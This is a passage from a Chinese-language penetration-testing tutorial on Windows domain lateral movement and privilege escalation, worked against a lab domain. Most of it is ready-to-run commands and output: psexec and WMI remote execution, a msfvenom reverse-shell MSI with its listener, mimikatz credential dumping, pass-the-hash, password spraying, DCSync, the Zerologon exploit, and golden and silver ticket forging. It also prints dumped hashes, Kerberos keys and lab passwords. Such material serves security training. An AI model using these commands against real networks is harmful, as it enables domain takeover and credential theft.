python D:\environment\Python\Python311\Scripts\psexec.py administrator:"qwe.123"@192.168.70.32 "cmd \c chcp 65001"
```

![image-20241018100207333](https://image.201068.xyz/assets/38.后渗透/image-20241018100207333.png)

![image-20241018100302067](https://image.201068.xyz/assets/38.后渗透/image-20241018100302067.png)

![image-20241018100324355](https://image.201068.xyz/assets/38.后渗透/image-20241018100324355.png)

#### Metasploit

```bash
msfconsole
use exploit/windows/smb/psexec
show options
set rhost 192.168.70.32
set SMBUser administrator
set smbpass qwe.123
run
```

![image-20241018095126418](https://image.201068.xyz/assets/38.后渗透/image-20241018095126418.png)

## 六.WMI利用

WMI (Windows Management Instrumentation，Windows管理规范）是一项核心的 Windows 管理技术。

用户可以通过 WMI 管理本地和远程计算机。

在横向移动时，测试人员可以利用WMI提供的管理功能，通过已获取的用户凭据，与本地或远程主机进行交互，并控制其执行各种行为。

可以通过调用 WMI 的类方法进行远程执行，如 Win32_Process 类中的 Create 方法可以在远程主机上创建进程，Win32_Product类中的 Install 方法可以在远程主机上安装恶意的MSI

利用WMI进行横向移动需要具备以下条件：

1. ①远程主机的WMI服务为开启状态（默认开启）
2. ②远程主机防火墙放行135端口，这是WMI管理的默认端口。

### 常规利用方法

在Windows上可以通过`wmic.exe`和 `PowerShell Cmdlet` 来使用WMI数据和执行WMI方法。

`wmic.exe` 是一个与 WMI 进行交互的强大的命令行工具，拥有大量的 WMI 对象的默认别名，可以执行许多复杂的查询。

Windows PowerShell 也提供了许多可以与 WMI 进行交互的 `Cmdlet`，如 `Invoke-WmiMethod`，`Set-Wmilnstance`等。

#### 1.进行远程查询：

```bash
wmic /node:192.168.70.32 /user:administrator /password:qwe.123 process list brief
```

> `/node`，指定远程主机的地址；
>
> `/user`，指定远程主机的用户名；
>
> `/password`，指定用户的密码

![image-20241018101454302](https://image.201068.xyz/assets/38.后渗透/image-20241018101454302.png)

#### 2.创建远程进程

```bash
wmic /node:192.168.70.32 /user:administrator /password:qwe.123 process call create "cmd.exe /c c:\6666.exe"
```

> `/node:192.168.70.32`：这个参数指定了远程计算机的 IP 地址。
>
> `/user:administrator`：这个参数指定了用于连接远程计算机的用户名。
>
> `/password:qwe.123`：这个参数提供了连接远程计算机时所用的密码。
>
> `process call create`：这是 wmic 的一个命令组合，用于在远程系统上创建一个新进程。
>
> `process` 是 WMI 中的一个类，表示系统上的进程；
>
> `call` 是调用该类的方法的动词；
>
> `create` 是具体要调用的方法，用于创建新进程。
>
> `"cmd.exe /c c:\6666.exe"`：这是 create 方法需要的参数，即要执行的命令行命令。

通过调用 `Win32_Process.Create` 方法在远程主机上创建进程，启动木马文件。

![image-20241018101622652](https://image.201068.xyz/assets/38.后渗透/image-20241018101622652.png)

#### 3.远程安装 MSI 文件

通过调用 `Win32_Product,Install` 方法，可以控制远程主机安装恶意的 MSI 文件，从而获取其权限。

##### 1）生成恶意MSI 文件

使用 MSF 生成一个恶意的 MSI 文件

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.70.4 lport=8888 -f msi -o 8888.msi
```

![image-20241018102742682](https://image.201068.xyz/assets/38.后渗透/image-20241018102742682.png)

##### 2）msf监听

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter_reverse_tcp
set lhost 192.168.70.4
set lport 8888
run
```

![image-20241018102804200](https://image.201068.xyz/assets/38.后渗透/image-20241018102804200.png)

##### 3）加载 MSI

在**跳板机上**执行下列命令加载 MSI 

> wmic /node:192.168.70.32 /user:administrator /password:qwe.123 product call install PackageLocation="c:\8888.msi"

```bash
upload /root/tools/cobaltstrike/payload/8888.msi
shell copy 8888.msi \\192.168.70.32\c$
shell wmic /node:192.168.70.32 /user:administrator /password:qwe.123 product call install PackageLocation="c:\8888.msi"
```

> `/node:192.168.70.32`：指定远程计算机的 IP 地址。
>
> `/user:administrator`：指定用于连接远程计算机的用户名。
>
> `/password:qwe.123`：提供连接远程计算机时所用的密码。
>
> `product call install`：product 是 WMI 中的一个类，表示系统上安装的软件。
>
> `call` 是调用该类的方法的动词。
>
> `install` 是具体要调用的方法，用于安装新的软件产。
>
> `PackageLocation="c:\8888.msi"`：这是 install 方法需要的参数，指定了要安装的 MSI 软件包的路径。

![image-20241018105654302](https://image.201068.xyz/assets/38.后渗透/image-20241018105654302.png)

![image-20241018105620201](https://image.201068.xyz/assets/38.后渗透/image-20241018105620201.png)

### Wmiexec利用

`Impacket` 项目的 `wmiexec.py`能够以全交互或半交互的方式，通过WMI在远程主机上执行命令。

注意，该工具需要远程主机开启`135`和`445`端口，其中445端口用于**传输命令执行的回显**。

执行以下命令，

#### 获取远程主机的交互式命令行

> `impacket-wmiexec <Domian>/<Username>:<Password>@<Ip>`

```bash
impacket-wmiexec wasj.test/Administrator:Admin@123@192.168.70.32
```

![image-20241018161307377](https://image.201068.xyz/assets/38.后渗透/image-20241018161307377.png)

## 七.PTH哈希传递攻击

### **PTH介绍**

PTH(Pass The Hash)，中文叫哈希传递攻击，在 Windows的登录认证中，都需要用到用户的 NTLM-Hash 值进行加密认证，所以我们知道了对方用户的NTLN-Hash值之后就可以使用 PTH 进行认证。

在域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本地管理员账号和密码，如果计算机的本地管理员账号和密码是相同的，攻击者就能使用哈希传递攻击的方法登录内网中的其他计算机。

### **PTH条件**

1. 1.有管理员的 NTLM Hash，并且目标机器开放445端口
2. 2.内网中使用相同的账号密码

#### 在本地账号的情况下

- Administrator可以进行PTH传递攻击
- 本地普通管理员（RID不等于500），不可以进行PTH攻击（除过早期的电脑2003xp）
- 本地的普通用户，不可以进行PTH攻击

#### 域账号

- Administrator可以用来PTH
- 域普通管理员（RID不等于500）可以用来PTH
- 域普通用户不可以（默认）

### **hash传递攻击方法**

```bash
#抓取用户哈希
mimikatz.exe "log" "privilege::debug" "sekurlsa::logonpasswords full" "exit"

#利用抓取到的哈希进行哈希传递
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /domain:win2008-x64.wasj.test /ntlm:a748ddf38085cb34e983cc5a1981b3d4 "exit"
```

> `/user` 指定要传递的用户名
>
> `/domain` 指定当前域名或工作组名
>
> `/ntlm` 指定用户哈希

```bash
C:\Users\Administrator\Desktop\mimikatz\x64\mimikatz.exe "log" "privilege::debug" "sekurlsa::logonpasswords full" "exit"
```

![image-20241018112510971](https://image.201068.xyz/assets/38.后渗透/image-20241018112510971.png)

```bash
C:\Users\Administrator\Desktop\mimikatz\x64\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /domain:win2008-x64.wasj.test /ntlm:a748ddf38085cb34e983cc5a1981b3d4 "exit"
```

![image-20241018112659666](https://image.201068.xyz/assets/38.后渗透/image-20241018112659666.png)

### **Hash碰撞查询可利用的PTH**

在内网中系统在安装的时候采用统一的账号密码，

当我们获取的一台电脑的Hash值之后（administrator）可以使用hash碰撞的方式进行碰撞，（本质就是批量进行hash传递）找出相同的账号密码的机器。

可以使用`CrackMapExec`工具，进行批量的`hash`传递攻击，**测试内网中具有相同账号密码**的机器，

工具下载地址：[https://github.com/Porchetta-Industries/CrackMapExec/releases/tag/v5.4.0](https://github.com/Porchetta-Industries/CrackMapExec/releases/tag/v5.4.0)

#### 跑本地用户时随意指定域名 

```bash
hashdump

crackmapexec.exe 192.168.70.0/24 -d wasj.test -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

> 格式： -d 任意域名

![image-20241018141009385](https://image.201068.xyz/assets/38.后渗透/image-20241018141009385.png)

```bash
shell cd C:\Users\user\Desktop\CrackMapExecWindows\CrackMapExecWindows-master&&crackmapexec.exe 192.168.70.0/24 -d wasj.test -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

![image-20241018141732367](https://image.201068.xyz/assets/38.后渗透/image-20241018141732367.png)

## 域内常用攻击手段

### 域内用户枚举和密码喷洒

**暴力破解用户名和密码**

原理：在AS-REQ阶段客户端向AS发送用户名，cname字典存放用户名，AS对用户名进行验证，用户存在和不存在返回的数据包不一样

`KRB5DC_ERR_PREAUTH_REQUIRED` 需要额外的预认证（用户存在）但是没有提供密码

`KRB5DC_ERR_CLIENT_REVOKED` 客户端凭证已被吊销（禁用）

`KRB5DC_ERR_C_PRINCIPAL_UNKNOWN` 在Kerberos数据库中找不到客户端（不存在）

`KRB5KDC_ERR_PREAUTH_FAILED`（用户存在密码错误）

![](https://image.201068.xyz/assets/38.后渗透/202307310615166.png)

#### 用户枚举

> kerbrute.exe userenum --dc 192.168.70.32 -d abc.net username.txt

```bash
shell C:\Users\user\Desktop\kerbrute\kerbrute.exe userenum --dc 192.168.70.33 -d wasj.test C:\Users\user\Desktop\kerbrute\username.txt
```

![image-20241018143346273](https://image.201068.xyz/assets/38.后渗透/image-20241018143346273.png)

#### 密码喷洒

> kerbrute.exe passwordspray --dc 192.168.70.33 -d wasj.test username.txt Admin@123

```bash
shell C:\Users\user\Desktop\kerbrute\kerbrute.exe passwordspray --dc 192.168.70.33 -d wasj.test C:\Users\user\Desktop\kerbrute\username.txt Admin@123
```

![image-20241018143537514](https://image.201068.xyz/assets/38.后渗透/image-20241018143537514.png)

### DCSync攻击技术

**域内的用户凭据收集**

一个域环境可以拥有多台域控制器，每台域控制器各自存储着一份所在域的活动目录的可写副本，对目录的任何修改都可以从源域控制器同步到本域.域树或域林中的其他域控制器上。

当一个域控想从另一个域控获取域数据更新时，客户端域控会向服务端域控发送`DSGeNCChanges` 请求，该请求的响应将包含客户端域控必须应用到其活动目录副本的一组更新。

通常情况下，域控制器之间**每15分钟就会有一次域数据同步**。

DCSync 技术就是利用域控制器同步的原理，通过 `Directory Replication Service` (DRS) 服务的`IDL_DRSGetNCChanges` 接口向域控发起数据同步请求。

在 `DCSync` 出现前，要**获得所有域用户的哈希**，测试人员可能需要**登录域控制器**或**通过卷影拷贝技术**获取 `NTDS.dit` 文件。

利用 DCSync，测试人员可以在域内任何一台机器上模拟一个域控制器通过域**数据同步复制的方式**获取正在运行的合法域控制器上的数据。

在默认情况下，只有`Administrators.Domain Controllers` 和 `Enterprise Domain Admins` 组内的**用户**和**域控制器的机器账户**才有执行 `DCSync` 操作的权限。

#### 利用 Mimikatz 导出域内哈希

Mimikatz 在 2015 年 8 月添加了 `DCSync` 功能，执行以下命令进行导出。

##### 导出域内指定用户的信息

> mimikatz.exe "lsadump::dcsync /domain:wasj.test /user:wasj\administrator /csv" exit

```bash
C:\Users\user\Desktop\mimikatz\x64\mimikatz.exe "lsadump::dcsync /domain:wasj.test /user:wasj\administrator /csv" exit
```

![image-20241018145241818](https://image.201068.xyz/assets/38.后渗透/image-20241018145241818.png)

##### 导出域内所有用户的信息

> mimikatz.exe "lsadump::dcsync /domain:wasj.test /all /csv" exit

```bash
C:\Users\user\Desktop\mimikatz\x64\mimikatz.exe mimikatz.exe "lsadump::dcsync /domain:wasj.test /all /csv" exit
```

![image-20241018145345115](https://image.201068.xyz/assets/38.后渗透/image-20241018145345115.png)

```bash
502	krbtgt	844854d0e8a1a657b2ed5c806f938c01	514

1106	WIN7-X64$	2d294c8fbbce9ef81928fbb7a5051b64	4096

1105	win2008	570a9a65db8fba761c1008a51d4c95ab	66048

1104	win7	570a9a65db8fba761c1008a51d4c95ab	66048

1107	WIN2008-X64$	86c14bcd3700b2122900783e6a6f1c0f	4096

500	Administrator	570a9a65db8fba761c1008a51d4c95ab	66048

1001	DC$	6ddfde72949191a652a31de199330b1b	532480
```

#### 利用 Impacket 导出域内哈希

impacket 项目中的 `secretsdump.py` 脚本支持通过 DCSync 技术导出域控制器中用户哈希。

该工具可以使用提供的**高权限用户的登录凭据**，**从未加入域的系统上远程连接至域控制器**，**导出所有域用户的哈希值**。

```bash
impacket-secretsdump wasj.test/administrator:"Admin@123"@192.168.70.32 -just-dc-user "wasj\administrator"
```

> #192.168.70.32为域控制器的 IP

### Zerologon域内提权

Zerologon（`CVE-2020-1472`）是 Netlogon 远程协议的一个特权提升漏洞，可以在不提供任何凭据的情况下通过身份验证，并实现域内提权。

该漏洞的最常见的利用方法是调用 Netlogon 中的 RPC 函数 `NetrServerPasswordSet2` 来重置域控制器的密码。

注意，这里重置的是域控机器账户的密码，该密码由系统随机生成，密码强度是120个字符，并且会定时更新。

机器用户拥有域用户的一切属性，在特定意义上也是一种域用户。域内的机器账户以“`机器名+S`”来命名，如域控制器DC-1的机器用户就是`DC-1$2` 
机器账户是不允许登录的，所以不能直接通过重置后的机器账户来登陆域控制器。

但是，**域控制器的机器账户**在**默认情况下拥有DCSync 权限**，因此可以通过 DCSync 攻击导出域管理员密码的哈希值，进而获取域控权限。攻击过程如下。

#### 1.配置环境

```bash
cd /root/tools/domain/内核提权/Windows-exploits-WindowsExploitsCollections/CVE-2020-1472
python3 -m pip install -r Kernelhub.txt
```

![image-20241018155228276](https://image.201068.xyz/assets/38.后渗透/image-20241018155228276.png)

#### 2.测试机器是否存在漏洞

> `CVE-2020-1472_Scan.py <dc-name> <dc-ip>`

```bash
python3 CVE-2020-1472_Scan.py dc 192.168.70.33
```

![image-20241018155338349](https://image.201068.xyz/assets/38.后渗透/image-20241018155338349.png)

#### 3.将域控制器密码的**密码设置为空**。

（该脚本会使用后会把密码重置为空！！乱用容易照成损失！！）

> `CVE-2020-1472_Exploit.py <dc-name> <dc-ip>`

```bash
python3 CVE-2020-1472_Exploit.py dc 192.168.70.33
```

![image-20241018155410670](https://image.201068.xyz/assets/38.后渗透/image-20241018155410670.png)

#### 4.接着使用空密码登录，使用 `DCSync` 导出 `hash`

> `impacket-secretsdump <dc>/<dc-name>\$@<dc-ip> -no-pass`

```bash
impacket-secretsdump wasj.test/dc\$@192.168.70.33 -no-pass
```

![image-20241018155539507](https://image.201068.xyz/assets/38.后渗透/image-20241018155539507.png)

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:570a9a65db8fba761c1008a51d4c95ab:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:844854d0e8a1a657b2ed5c806f938c01:::
wasj.test\win7:1104:aad3b435b51404eeaad3b435b51404ee:570a9a65db8fba761c1008a51d4c95ab:::
wasj.test\win2008:1105:aad3b435b51404eeaad3b435b51404ee:570a9a65db8fba761c1008a51d4c95ab:::
DC$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WIN7-X64$:1106:aad3b435b51404eeaad3b435b51404ee:2d294c8fbbce9ef81928fbb7a5051b64:::
WIN2008-X64$:1107:aad3b435b51404eeaad3b435b51404ee:86c14bcd3700b2122900783e6a6f1c0f:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:2082907ae51f7de9942def082d2d93c1904a484c7771329c682b6d1fed47b1ef
Administrator:aes128-cts-hmac-sha1-96:15a1c60d721b8373ff8f0a5d0362649a
Administrator:des-cbc-md5:5b2098c28986fed6
krbtgt:aes256-cts-hmac-sha1-96:5d48b584d1f1ae2324afc0ecd3ca45ccb5a25cdb405e721557d091076c069b94
krbtgt:aes128-cts-hmac-sha1-96:14fcd3fb60f69e6737c73c990d15324f
krbtgt:des-cbc-md5:4085fb166838cdd3
wasj.test\win7:aes256-cts-hmac-sha1-96:ed26ff95cabf071895066324891f13d8378d882be947130ed5e5b70a38f94e16
wasj.test\win7:aes128-cts-hmac-sha1-96:049277bd8f704cc126668c8e153e9538
wasj.test\win7:des-cbc-md5:525bad3be01f57d0
wasj.test\win2008:aes256-cts-hmac-sha1-96:8931e288e6d57597140a54906c455127234da3e6e68c30102d19fca2757ed482
wasj.test\win2008:aes128-cts-hmac-sha1-96:0b501deb00ef19ef6409840ea7c8024a
wasj.test\win2008:des-cbc-md5:f4151f8a86ef8c97
DC$:aes256-cts-hmac-sha1-96:05233735cc4de09ab8fe200e052cc0b2e7b3031282431628107c158dc7047790
DC$:aes128-cts-hmac-sha1-96:ce767caf164cdaea1350fe2d1aa3ab82
DC$:des-cbc-md5:4310add67a2619b5
WIN7-X64$:aes256-cts-hmac-sha1-96:426c792adbaf348e55c368e7fd572bafd4e97dbadd3cbd6ffa248f0495fea969
WIN7-X64$:aes128-cts-hmac-sha1-96:32d292bfad842f044aa096056b2340b9
WIN7-X64$:des-cbc-md5:cbcde6799273a4fe
WIN2008-X64$:aes256-cts-hmac-sha1-96:46d828e46f0fa0d6f633c1ac40f3eeed444f2b27be98646b982b7fe70905e093
WIN2008-X64$:aes128-cts-hmac-sha1-96:4df8a140b577cb94d719b81eca178a49
WIN2008-X64$:des-cbc-md5:ea493707c820ba3d
```

#### 5.利用hash进行登录

> `impacket-wmiexec -hashes <user-hash> <dc>/<user-name>@<dc-ip>`

```bash
cd impacket/examples/
python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:570a9a65db8fba761c1008a51d4c95ab wasj.test/administrator@192.168.70.33
```

![image-20241018155905177](https://image.201068.xyz/assets/38.后渗透/image-20241018155905177.png)

![image-20241018160344569](https://image.201068.xyz/assets/38.后渗透/image-20241018160344569.png)

#### 6.还原密码

攻击完成后要及时还原密码，

保存**注册表中的密码**，

然后**下载到本地**，

接着**删除域控上的文件**

```bash
chcp 65001

reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save

get system.save
get sam.save
get security.save

del system.save
del sam.save
del security.save
```

#### 7.导出注册表中的hash

```bash
cd /root/tools/domain/内核提权/Windows-exploits-WindowsExploitsCollections/CVE-2020-1472/impacket/examples/
python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

![image-20241018160813539](https://image.201068.xyz/assets/38.后渗透/image-20241018160813539.png)

> 6ddfde72949191a652a31de199330b1b

#### 8.恢复密码

下图所示位置为修改之前的密码，接着使用 `CVE-2020-1472_RestoreOriginalPassword.py` 脚本恢复密码

> `CVE-2020-1472_RestoreOriginalPassword.py <dc-name> <dc-ip> <dc-original-hash>`

```bash
cd /root/tools/domain/内核提权/Windows-exploits-WindowsExploitsCollections/CVE-2020-1472
python3 CVE-2020-1472_RestoreOriginalPassword.py dc 192.168.70.33 6ddfde72949191a652a31de199330b1b
```

![image-20241018161146021](https://image.201068.xyz/assets/38.后渗透/image-20241018161146021.png)

### 黄金票据攻击

在Kerberos认证中，每个用户的票据都是由`krbtgt`的**NTLM哈希值**加密生成的，**获得krbtgt的哈希值**，便可以**伪造任意用户的票据**，这种攻击方式被称为黄金票据（Golden Ticket)。

已有了金票后，就**跳过AS验证**，不用验证账户和密码，所以也**不担心域管密码修改**。 

攻击需要以下信息：**域名**，**域sid**，`krbtgt哈希值`，`伪造的用户`

#### mimikatz

> 域控机器上
>
> wasj\administrator  / Admin@123

```bash
cd C:\Users\Administrator\Desktop\mimikatz\x64

#导出域内所有用户的信息
shell mimikatz.exe "lsadump::dcsync /domain:wasj.test /all /csv" "exit" 

#导出哈希
shell mimikatz.exe "log" "privilege::debug" "lsadump::lsa /patch" "exit" 

#制作票据
shell mimikatz.exe "kerberos::golden /admin:Administrator /domain:wasj.test /sid:S-1-5-21-1449925610-700517293-2636695646 /krbtgt:844854d0e8a1a657b2ed5c806f938c01 /ticket:golden.kirbi" "exit" 

#清除票据
shell mimikatz.exe "kerberos::purge" "exit" 

#导入票据
shell mimikatz.exe "kerberos::ptt golden.kirbi" "exit" 
```

![image-20241018165357179](https://image.201068.xyz/assets/38.后渗透/image-20241018165357179.png)

```bash
502	krbtgt	844854d0e8a1a657b2ed5c806f938c01	514
```

![image-20241018165429931](https://image.201068.xyz/assets/38.后渗透/image-20241018165429931.png)

> Domain : WASJ / S-1-5-21-1449925610-700517293-2636695646

![image-20241018165634268](https://image.201068.xyz/assets/38.后渗透/image-20241018165634268.png)

![image-20241018165729726](https://image.201068.xyz/assets/38.后渗透/image-20241018165729726.png)

![image-20241018165804395](https://image.201068.xyz/assets/38.后渗透/image-20241018165804395.png)

#### impacket利用

```shell
#生成票据
impacket-ticketer -domain-sid S-1-5-21-1449925610-700517293-2636695646 -nthash 844854d0e8a1a657b2ed5c806f938c01 -domain wasj.test administrator

#设置票据文件
export KRB5CCNAME=administrator.ccache

#设置kali的hosts文件
vim /etc/hosts

192.168.70.33 dc.wasj.test

#利用票据登录目标主机
impacket-psexec -k -no-pass administrator@dc.wasj.test
```

![image-20241018170259544](https://image.201068.xyz/assets/38.后渗透/image-20241018170259544.png)

![image-20241018170319883](https://image.201068.xyz/assets/38.后渗透/image-20241018170319883.png)

![image-20241018171938967](https://image.201068.xyz/assets/38.后渗透/image-20241018171938967.png)

![image-20241018171628151](https://image.201068.xyz/assets/38.后渗透/image-20241018171628151.png)

![image-20241018172036544](https://image.201068.xyz/assets/38.后渗透/image-20241018172036544.png)

#### cs界面

![image-20241018170047508](https://image.201068.xyz/assets/38.后渗透/image-20241018170047508.png)

![image-20241018170124942](https://image.201068.xyz/assets/38.后渗透/image-20241018170124942.png)

### 白银票据攻击

在`Kerberos`认证的第三部，Client带着ST向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的serve rhash 解密ST,从而获得 CS_SK。

通过  CS_SK 解密进而验证对方的身份,验证成功就让 Client 访问server上的指定服务了。  

所以我们只需要知道Server用户的Hash就可以伪造出一个ST,且不会经过KDC,但是伪造的门票只对部分服务起作用。

1. **域名**  
2.  **域sid**  
3.  **目标服务器名**  
4.  **可利用的服务**  
5.  **服务账号的 NTML HASH**   
6.  需要**伪造的用户名**

![](https://image.201068.xyz/assets/38.后渗透/202307310713539.png)

#### 命令

```bash
cd C:\Users\Administrator\Desktop\mimikatz\x64

#导出凭证
shell mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"

#白银票据
shell mimikatz.exe "kerberos::golden /domain:wasj.test /sid:S-1-5-21-1449925610-700517293-2636695646 /target:dc.wasj.test /service:cifs /rc4:6ddfde72949191a652a31de199330b1b /user:administrator /ptt"
```

![image-20241018173831331](https://image.201068.xyz/assets/38.后渗透/image-20241018173831331.png)

> 6ddfde72949191a652a31de199330b1b

![image-20241018173948715](https://image.201068.xyz/assets/38.后渗透/image-20241018173948715.png)
